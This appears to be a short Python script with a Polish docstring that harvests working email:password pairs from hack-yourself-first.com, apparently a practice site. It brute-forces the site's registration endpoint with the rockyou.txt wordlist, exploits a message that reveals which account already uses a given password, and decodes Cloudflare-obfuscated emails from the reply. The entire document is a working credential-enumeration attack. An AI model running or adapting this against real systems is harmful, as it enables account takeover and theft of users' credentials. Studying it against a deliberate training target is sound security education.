"""
WAŻNE: trzeba pobrać plik rockyou.txt żeby poprawnie działało.
Cel zadania:
Sporządzenie listy działających kombinacji login:hasło na stronie hack-yourself-first.com
Hakujemy endpoint - https://hack-yourself-first.com/Account/Register
Wykorzystujemy fakt, że strona jest inwalidą i mówi nam, że nie możemy użyć danego hasła,
bo już używa je konto x@y.z
"""
import requests
from bs4 import BeautifulSoup


def deCFEmail(fp):
    try:
        r = int(fp[:2], 16)
        email = ''.join([chr(int(fp[i:i + 2], 16) ^ r) for i in range(2, len(fp), 2)])
        return email
    except (ValueError):
        pass

dzialajacehasla = []
with open("rockyou.txt", "r") as slownikhasel:
    for haslo in slownikhasel:
        haslo = haslo.replace("\n","")
        payload = {"Email": "qweqweqweqwe@gmail.com", "FirstName": "qwe", "LastName": "qwe", "Password": haslo,
                   "ConfirmPassword": haslo}
        r = requests.post('https://hack-yourself-first.com/Account/Register', data=payload)
        zupa = BeautifulSoup(r.text, 'html.parser')
        for acfemial in zupa.find_all('a'):
            cfemail = acfemial.get('data-cfemail')
            if cfemail:
                print(f"{deCFEmail(cfemail)}:{haslo}")